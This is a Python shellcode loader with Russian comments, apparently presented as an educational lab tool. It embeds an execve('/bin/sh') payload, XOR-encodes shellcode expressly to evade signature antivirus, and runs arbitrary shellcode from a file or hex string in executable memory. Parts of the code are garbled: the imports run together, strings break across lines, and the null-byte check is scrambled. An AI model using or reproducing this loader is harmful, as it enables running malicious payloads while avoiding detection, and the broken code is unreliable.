
#!/usr/bin/env python3
importimportimportimportimportctypes
mmap
os
sys
argparse
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── Тестовый shellcode — Linux x86_64 execve("/bin/sh")
───────────────────────
# Сгенерирован msfvenom: msfvenom -p linux/x64/exec CMD=/bin/sh -f python
# NB: В реальной работе shellcode генерируется под конкретную цель и
архитектуру
SHELLCODE_EXECVE = bytearray(
b"\x48\x31\xf6"
 # xor rsi, rsi
b"\x56"
 # push rsi
b"\x48\xbf\x2f\x62\x69\x6e" # movabs rdi, '/bin'
b"\x2f\x73\x68\x00"
 # mov rdi, '/sh\0'
b"\x57"
 # push rdi
b"\x48\x89\xe7"
 # mov rdi, rsp
b"\x48\x31\xd2"
 # xor rdx, rdx
b"\xb0\x3b"
 # mov al, 59 (execve syscall)
b"\x0f\x05"
 # syscall
)
# ── Демонстрационный shellcode — просто выполняет exit(0)
─────────────────────
SHELLCODE_EXIT = bytearray(
b"\x48\x31\xff" # xor rdi, rdi (exit code = 0)
b"\xb8\x3c\x00\x00\x00" # mov eax, 60 (exit syscall)
b"\x0f\x05" # syscall
)
def xor_decode(encoded_shellcode: bytes, key: int) -> bytearray:
"""
XOR-декодирование шеллкода.
Используется для обхода сигнатурного AV — хранить в файле
зашифрованную версию.
"""
return bytearray(b ^ key for b in encoded_shellcode)
def xor_encode(shellcode: bytes, key: int) -> bytes:
"""XOR-шифрование шеллкода перед хранением."""
return bytes(b ^ key for b in shellcode)
def load_and_exec(shellcode: bytearray) -> None:
sc_len = len(shellcode)
print(f"{CYAN}[*] Размер shellcode: {sc_len} байт{RESET}")
print(f"{CYAN}[*] Первые байты: {shellcode[:16].hex()}{RESET}")
# Выделяем анонимную страницу памяти с правами rwx
# mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC = 7
try:
mem = mmap.mmap(
-1,
 # fd=-1: анонимное отображение (не связано с файлом)
sc_len,
 # Размер
mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, # Флаги
mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC # Права
)
except Exception as e:
print(f"{RED}[!] mmap ошибка: {e}{RESET}")
print(f"{RED}[!] Попробуй: sudo sysctl -w vm.mmap_min_addr=0{RESET}")
return
# Копируем shellcode в выделенную память
mem.write(bytes(shellcode))
mem.seek(0) # Перемещаем указатель в начало
# Получаем адрес выделенной памяти
# В Linux mmap возвращает объект, нам нужен сырой адрес через ctypes
mem_address = ctypes.addressof(ctypes.c_char.from_buffer(mem))
print(f"{CYAN}[*] Shellcode загружен по адресу:
0x{mem_address:016x}{RESET}")
# Создаём вызываемый указатель на shellcode
# CFUNCTYPE(ret_type) — создаёт тип C-функции без аргументов
func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)
func_ptr = func_type(mem_address)
print(f"{YELLOW}[*] Выполняем shellcode...{RESET}")
print("-" * 40)
# Вызываем shellcode как функцию
func_ptr()
# До сюда дойдём только если shellcode вернул управление (не execve)
print(f"{GREEN}[+] Shellcode выполнен (управление возвращено){RESET}")
mem.close()
def analyze_shellcode(shellcode: bytes) -> None:
"""Базовый анализ shellcode."""
print(f"\n{CYAN}=== Анализ Shellcode ==={RESET}")
print(f" Размер: {len(shellcode)} байт")
print(f" Hex: {shellcode.hex()}")
# Определяем архитектуру по характерным байтам
if shellcode[:2] == b"\x48\x31" or b"\x0f\x05" in shellcode:
print(f" {GREEN}Архитектура: Linux x86_64 (syscall найден){RESET}")
elif shellcode[:2] == b"\x31\xc0" or b"\xcd\x80" in shellcode:
print(f" {GREEN}Архитектура: Linux x86_32 (int 0x80 найден){RESET}")
elif b"\x64\xa1" in shellcode:
print(f" {GREEN}Архитектура: Windows x86{RESET}")
# Проверяем наличие NULL байт
null_count = shellcode.count(b"\x00")
if null_count print(f" {YELLOW} > 0:
 ⚠
 NULL байт: {null_count} штук — могут вызвать
обрезание строки{RESET}")
null_positions = [i for i, b in enumerate(shellcode) if b == 0]
print(f" NULL позиции: {null_positions[:10]}")
else:
print(f" {GREEN}NULL байт: отсутствуют ✓{RESET}")
# Энтропия (высокая = зашифровано/запакованно)
if len(shellcode) > 0:
unique = len(set(shellcode))
entropy_approx = unique / 256 * 100
print(f" Уникальных байт: {unique}/256 ({entropy_approx:.0f}% — "
f"{'высокая энтропия' if entropy_approx > 60 else 'нормальная'})")
def main():
parser = argparse.ArgumentParser(
description="Shellcode Loader (educational, use only in isolated lab)"
)
parser.add_argument("--shellcode", default="exit",
choices=["exit", "execve"],
help="Встроенный shellcode для теста")
parser.add_argument("--file",
 default=None,
help="Загрузить shellcode из файла (бинарные байты)")
parser.add_argument("--hex",
 default=None,
help="Shellcode в hex: '4831ff...'")
parser.add_argument("--xor-key", type=int, default=0,
help="XOR ключ для расшифровки (0 = без расшифровки)")
parser.add_argument("--analyze", action="store_true",
help="Только анализировать, не выполнять")
args = parser.parse_args()
# Загружаем shellcode из разных источников
if args.file:
with open(args.file, "rb") as f:
shellcode = bytearray(f.read())
elif args.hex:
shellcode = bytearray(bytes.fromhex(args.hex.replace(" ", "")))
elif args.shellcode == "exit":
shellcode = SHELLCODE_EXIT.copy()
else:
shellcode = SHELLCODE_EXECVE.copy()
# Декодируем если зашифрован
if args.xor_key:
print(f"{YELLOW}[*] XOR декодирование с ключом
0x{args.xor_key:02x}...{RESET}")
shellcode = xor_decode(shellcode, args.xor_key)
analyze_shellcode(shellcode)
if args.analyze:
return
if sys.platform != "linux":
print(f"{RED}[!] Загрузчик работает только на Linux{RESET}")
return
print(f"\n{YELLOW}[!] ВНИМАНИЕ: Выполнение shellcode. Только в
изолированной VM!{RESET}")
load_and_exec(shellcode)
if __name__ == "__main__":
main()
